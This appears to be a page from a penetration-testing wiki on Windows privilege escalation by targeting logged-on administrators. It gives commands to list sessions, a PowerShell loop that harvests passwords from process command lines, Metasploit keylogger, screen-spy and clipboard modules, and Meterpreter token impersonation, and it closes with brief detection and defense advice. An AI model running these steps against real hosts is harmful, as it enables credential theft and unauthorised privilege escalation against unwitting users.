# Interacting with Users

When a host has other users logged on — especially administrators — they become an escalation vector in their own right. Rather than exploiting a misconfiguration, you **watch and wait**: capture what a privileged user types, clicks, or copies, and harvest the credentials or tokens they expose. This is noisier and slower than a direct vector, but on a well-patched host with active admins it is often the most reliable path.

## See who is logged on

```cmd
query user
qwinsta
tasklist /v | findstr /i "explorer.exe"
```

An administrator with an interactive session is a live credential source.

## Snoop on processes and command lines

Watch for privileged processes launched with credentials on the command line:

```powershell
while ($true) {
  Get-WmiObject Win32_Process | Where-Object { $_.CommandLine -match 'pass|/user|-p ' } |
    Select-Object Name, CommandLine
  Start-Sleep 2
}
```

(This is the live equivalent of mining [the Security log](Windows-Built-in-Groups/Event-Log-Readers.md).)

## Clipboard, keystrokes, and screenshots

With a session in the same or higher context, capture the interactive user's activity:

```text
# Metasploit post modules against a session in the user's context
post/windows/capture/keylog_recorder
post/windows/gather/screen_spy
post/windows/gather/clipboard_monitor
```

A privileged user pasting a password or typing into a `runas`/RDP prompt hands you the credential.

## Token theft from their processes

If you can already open a privileged user's process ([SeDebug Abuse](Token-Privilege-Abuse/SeDebug-Abuse.md)), steal its token instead of waiting:

```text
meterpreter > load incognito
meterpreter > list_tokens -u
meterpreter > impersonate_token "DOMAIN\\admin"
```

## Detection and defenses

- **Detection:** keylogger/screen-capture/clipboard-monitor module signatures, unusual process enumeration loops, token-manipulation events (4674), cross-session process access.
- **Defenses:** avoid interactive admin logons on lower-trust hosts (use PAWs/jump hosts), never type or paste secrets into untrusted sessions, and deploy EDR that flags input capture.

## Related
- [Windows Privilege Escalation](README.md) — category MOC
- [SeDebug Abuse](Token-Privilege-Abuse/SeDebug-Abuse.md) — open another user's process to steal its token
- [Event Log Readers](Windows-Built-in-Groups/Event-Log-Readers.md) — the historical (logged) version of command-line snooping
- [Pillaging](Pillaging.md) — harvesting data and secrets once you hold the context
